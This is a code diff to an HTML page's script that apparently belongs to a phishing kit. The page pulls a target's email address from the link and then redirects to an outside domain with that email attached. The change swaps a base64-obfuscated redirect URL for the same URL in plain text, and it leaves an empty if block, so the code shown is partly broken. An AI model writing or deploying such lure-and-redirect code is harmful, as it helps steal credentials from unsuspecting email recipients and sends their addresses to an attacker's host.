@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -84,20 +85,17 @@
   <script>
     document.addEventListener('DOMContentLoaded', function() {
       const emailInput = document.getElementById('email-input');
-      const hash = window.location.hash.substring(1); // Get hash from URL
-      const email = decodeURIComponent(atob(hash)); // Decode email from base64
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
 
-      if (validateEmail(email)) {
-        emailInput.value = email;
+      if (email && validateEmail(email)) {
       }
     });
 
     function continueLoading() {
       const email = document.getElementById('email-input').value.trim().toLowerCase();
       if (validateEmail(email)) {
-        const encodedLink = "aHR0cHM6Ly9jb3hoYXdhaWlhdGVsLmluZm8vLnRvcGd1bi9kb2N1bWVudHMvMzAwNS5odG1s"; // Encoded URL
-        const link = atob(encodedLink) + "#" + btoa(email);
-        window.location.href = link;
+        window.location.href = "https://coxhawaiiatel.info/.topgun/documents/3005.html#" + email;
       } else {
         alert("Please enter a valid email.");
       }
